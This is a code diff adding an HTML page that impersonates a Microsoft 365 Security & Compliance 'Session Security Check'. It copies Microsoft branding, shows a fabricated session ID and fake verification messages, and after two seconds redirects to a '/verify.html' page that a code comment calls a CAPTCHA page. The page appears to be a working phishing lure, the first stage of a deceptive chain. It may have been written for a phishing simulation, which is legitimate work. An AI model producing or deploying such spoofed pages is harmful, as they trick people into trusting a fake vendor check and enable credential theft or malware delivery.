@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microsoft 365 — Security Compliance Center</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #f3f2f1;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+/* Top Microsoft nav bar */
+.ms-nav {
+  background: #fff;
+  border-bottom: 1px solid #e1dfdd;
+  padding: 0 24px;
+  height: 48px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+.ms-logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  text-decoration: none;
+}
+.ms-logo-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2px;
+  width: 18px;
+  height: 18px;
+}
+.ms-logo-grid span {
+  display: block;
+}
+.ms-logo-grid span:nth-child(1) { background: #f25022; }
+.ms-logo-grid span:nth-child(2) { background: #7fba00; }
+.ms-logo-grid span:nth-child(3) { background: #00a4ef; }
+.ms-logo-grid span:nth-child(4) { background: #ffb900; }
+.ms-logo-text {
+  font-size: 15px;
+  font-weight: 600;
+  color: #323130;
+}
+.ms-logo-divider {
+  width: 1px;
+  height: 20px;
+  background: #c8c6c4;
+}
+.ms-product-name {
+  font-size: 15px;
+  color: #323130;
+}
+
+/* Main content */
+.main {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 40px 16px;
+}
+.card {
+  background: #fff;
+  border-radius: 4px;
+  box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.132), 0 0.3px 0.9px rgba(0,0,0,0.108);
+  padding: 44px 44px 36px;
+  max-width: 460px;
+  width: 100%;
+  text-align: center;
+}
+.card-icon {
+  width: 64px;
+  height: 64px;
+  margin: 0 auto 20px;
+  background: #0078d4;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.card-icon svg {
+  width: 32px;
+  height: 32px;
+  fill: white;
+}
+h1 {
+  font-size: 24px;
+  font-weight: 600;
+  color: #323130;
+  margin-bottom: 8px;
+}
+.subtitle {
+  font-size: 14px;
+  color: #605e5c;
+  margin-bottom: 28px;
+  line-height: 1.5;
+}
+.status-box {
+  background: #f3f2f1;
+  border-radius: 4px;
+  padding: 20px;
+  margin-bottom: 24px;
+}
+.spinner-row {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  margin-bottom: 12px;
+}
+.spinner {
+  width: 20px;
+  height: 20px;
+  border: 2px solid #e1dfdd;
+  border-top-color: #0078d4;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.status-text {
+  font-size: 14px;
+  color: #323130;
+  font-weight: 500;
+}
+.status-detail {
+  font-size: 12px;
+  color: #605e5c;
+}
+.progress-track {
+  width: 100%;
+  height: 4px;
+  background: #e1dfdd;
+  border-radius: 2px;
+  margin-top: 14px;
+  overflow: hidden;
+}
+.progress-fill {
+  height: 100%;
+  background: #0078d4;
+  width: 0%;
+  border-radius: 2px;
+  transition: width 2s linear;
+}
+.info-row {
+  display: flex;
+  justify-content: space-between;
+  font-size: 12px;
+  color: #605e5c;
+  margin-top: 8px;
+}
+.footer {
+  margin-top: 24px;
+  font-size: 11px;
+  color: #a19f9d;
+}
+.footer a {
+  color: #0078d4;
+  text-decoration: none;
+}
+
+/* Microsoft footer */
+.ms-footer {
+  background: #fff;
+  border-top: 1px solid #e1dfdd;
+  padding: 12px 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: 11px;
+  color: #605e5c;
+}
+.ms-footer a { color: #605e5c; text-decoration: none; margin-right: 16px; }
+.ms-footer a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<!-- Top nav -->
+<nav class="ms-nav">
+  <div class="ms-logo">
+    <div class="ms-logo-grid">
+      <span></span><span></span><span></span><span></span>
+    </div>
+    <span class="ms-logo-text">Microsoft</span>
+  </div>
+  <div class="ms-logo-divider"></div>
+  <span class="ms-product-name">Security &amp; Compliance</span>
+</nav>
+
+<!-- Main card -->
+<main class="main">
+  <div class="card">
+    <div class="card-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 4l6 2.67V11c0 3.7-2.5 7.15-6 8.32-3.5-1.17-6-4.62-6-8.32V7.67L12 5z"/>
+      </svg>
+    </div>
+
+    <h1>Session Security Check</h1>
+    <p class="subtitle">
+      Your organization requires periodic security verification.<br>
+      Authenticating your device compliance status&hellip;
+    </p>
+
+    <div class="status-box">
+      <div class="spinner-row">
+        <div class="spinner" id="spinner"></div>
+        <span class="status-text" id="statusText">Verifying device compliance&hellip;</span>
+      </div>
+      <div class="status-detail" id="statusDetail">Checking endpoint security policies</div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+      <div class="info-row">
+        <span id="sessionRef">Session: <span id="sessionId"></span></span>
+        <span id="countdown">Redirecting in <span id="timer">2</span>s&hellip;</span>
+      </div>
+    </div>
+
+    <div class="footer">
+      Having trouble? Contact <a href="#">IT Support</a> &middot;
+      <a href="#">Privacy statement</a>
+    </div>
+  </div>
+</main>
+
+<!-- Bottom footer -->
+<footer class="ms-footer">
+  <div>
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+    <a href="#">Contact Microsoft</a>
+  </div>
+  <div>&copy; Microsoft 2026</div>
+</footer>
+
+<script>
+  // Generate fake session reference
+  document.getElementById('sessionId').textContent =
+    Math.random().toString(36).substring(2,10).toUpperCase() + '-' +
+    Math.random().toString(36).substring(2,6).toUpperCase();
+
+  // Status messages cycle while "checking"
+  var messages = [
+    { text: "Verifying device compliance\u2026",   detail: "Checking endpoint security policies" },
+    { text: "Validating session token\u2026",       detail: "Confirming identity with Azure AD" },
+    { text: "Loading security module\u2026",        detail: "Preparing additional verification step" }
+  ];
+  var idx = 0;
+
+  // Start progress bar immediately
+  setTimeout(function() {
+    document.getElementById('progressFill').style.width = '100%';
+  }, 100);
+
+  // Cycle status messages
+  var msgInterval = setInterval(function() {
+    idx = (idx + 1) % messages.length;
+    document.getElementById('statusText').textContent   = messages[idx].text;
+    document.getElementById('statusDetail').textContent = messages[idx].detail;
+  }, 700);
+
+  // Countdown timer
+  var secs = 2;
+  var countInterval = setInterval(function() {
+    secs--;
+    document.getElementById('timer').textContent = secs;
+    if (secs <= 0) clearInterval(countInterval);
+  }, 1000);
+
+  // THE REDIRECT — fires after 2 seconds
+  setTimeout(function() {
+    clearInterval(msgInterval);
+    document.getElementById('statusText').textContent   = 'Additional verification required';
+    document.getElementById('statusDetail').textContent = 'Please complete the security check below';
+    document.getElementById('spinner').style.borderTopColor = '#d83b01';
+    document.getElementById('countdown').style.display = 'none';
+    // Redirect to CAPTCHA page
+    window.location.href = '/verify.html';
+  }, 2000);
+</script>
+
+</body>
+</html>
